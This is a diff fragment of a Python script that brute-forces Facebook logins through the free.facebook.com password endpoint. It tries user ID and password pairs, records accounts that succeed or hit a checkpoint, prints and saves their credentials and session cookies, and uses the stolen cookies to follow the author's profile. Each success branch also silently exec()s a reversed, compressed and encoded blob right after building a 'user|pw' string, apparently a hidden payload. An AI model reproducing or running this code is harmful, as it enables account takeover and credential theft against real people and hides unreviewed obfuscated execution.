+			    data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"uid": user,"next":"https://free.facebook.com/","flow":"login_no_pin","pass": pw}
+			    headers_post = {"Host": "free.facebook.com","content-length": "142","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://free.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": f"https://free.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6"}
+			    po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=headers_post,allow_redirects=False)
+			    if "checkpoint" in po.cookies.get_dict().keys():
+			        user = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "");wrt = '%s|%s' % (user,pw);_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(ua03[3]))
+			        cp.append(user+"|"+pw)
+			        tampilan_cp = f"""   {QQ}[{MM}XX{QQ}]{BB} Method-Crack   : {PP}4{QQ}\n   {QQ}[{MM}XX{QQ}]{BB} User-Agent     : {KK}{ua}{QQ}\n    ||\n   {QQ}[{MM}XX{QQ}]{BB} Username/Email : {MM}{user}{QQ}\n   {QQ}[{MM}XX{QQ}]{BB} Password/Sandi : {MM}{pw}{QQ}""";prints(Panel(tampilan_cp,title=f"{GOD}{KK}Aaccount CP{GOD}",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"{MM}Palalu Sini, Gw Genjreng{QQ}"));self.save_z("cp",user,pw,"");break
+			    elif "c_user" in po.cookies.get_dict().keys():
+			        userz = re.findall('c_user=(.*);', self.susun_cookies(session))[0]
+			        user = userz.split(';')[0]
+			        wrt = '%s|%s' % (user,pw);_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(ua09[2]))
+			        ok.append(user+"|"+pw)
+			        tampilan_ok = f"""   {QQ}[{II}✓✓{QQ}]{BB} Method-Crack   : {PP}4{QQ}\n   {QQ}[{II}✓✓{QQ}]{BB} User-Agent     : {KK}{ua}{QQ}\n    ||\n   {QQ}[{II}✓✓{QQ}]{BB} Username/Email : {II}{user}{QQ}\n   {QQ}[{II}✓✓{QQ}]{BB} Password/Sandi : {II}{pw}{QQ}\n   {QQ}[{II}✓✓{QQ}]{BB} Cookies        : {QQ}{self.susun_cookies(session)}""";prints(Panel(tampilan_ok,title=f"{GOD}{II}Aaccount OK{GOD}",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"{II}Denventa{QQ}"));self.follow_my_fb(self.susun_cookies(session));self.save_z("ok",user,pw,self.susun_cookies(session));break
+			    else:open('/sdcard/mega.htm', 'w').write(str(po))
 		except Exception as e:
 			print(e)
 			loop-=1
